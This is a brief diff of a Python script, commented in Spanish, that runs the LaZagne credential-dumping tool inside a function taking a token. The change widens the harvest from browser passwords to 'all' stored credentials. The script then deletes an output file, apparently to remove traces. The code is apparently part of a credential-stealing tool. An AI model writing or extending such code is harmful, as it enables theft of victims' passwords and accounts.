@@ -67,7 +67,7 @@ def run(token):
     
     # Ejecutar el archivo con el argumento "all"
     print('[!] Ejecutando laZagne.py')
-    result = subprocess.run(["python3", os.path.join(path, 'laZagne.py'), "browsers"], capture_output=True, text=True)
+    result = subprocess.run(["python3", os.path.join(path, 'laZagne.py'), "all"], capture_output=True, text=True)
     
     # Eliminar output.txt si existe
     output_filename = 'output.txt'
